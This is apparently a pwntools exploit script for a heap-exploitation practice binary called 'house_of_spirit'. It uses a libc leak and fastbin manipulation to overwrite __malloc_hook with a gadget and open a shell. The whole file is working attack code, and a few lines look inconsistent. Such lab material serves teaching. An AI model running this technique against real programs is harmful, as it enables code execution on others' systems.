#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_spirit")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size, data & chunk name.
# Returns chunk index.
def malloc(size, data, name):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.sendafter(b"name: ", name)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send the index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.timeout = 0.1

# =============================================================================

# Set the "age" field.
age = 0x6f
io.sendafter(b"age: ", f"{age}".encode())

# Set the "username" field.
username = b"George"
io.sendafter(b"username: ", username)
io.recvuntil(b"> ")

# Request 0x70 chunks
dup = malloc(0x68, b"filler", "name1")
guard = malloc(0x68, b"filler", "name2")
spirit = malloc(0x18, b"c" * 8, b"c"*8 + p64(heap + 0x10))

# Get double free
free(dup)
free(guard)
free(spirit)

# Overwrite fastbins fd to malloc hook

chunkA = malloc(0x68, p64(libc.sym["__malloc_hook"] - 0x23), b"free")
chunkB = malloc(0x68, b"/bin/sh\x00", b"shell")
chunkB = malloc(0x68, b"/bin/sh\x00", b"shell")
chunkD = malloc(0x68, b"c"*0x13 + p64(libc.address + 0xe1fa1), b"system")

binsh = libc.search(b"/bin/sh\x00").__next__()

# print(binsh)

io.send(b"1")
io.sendafter(b"size: ", f"1")

# =============================================================================

io.interactive()
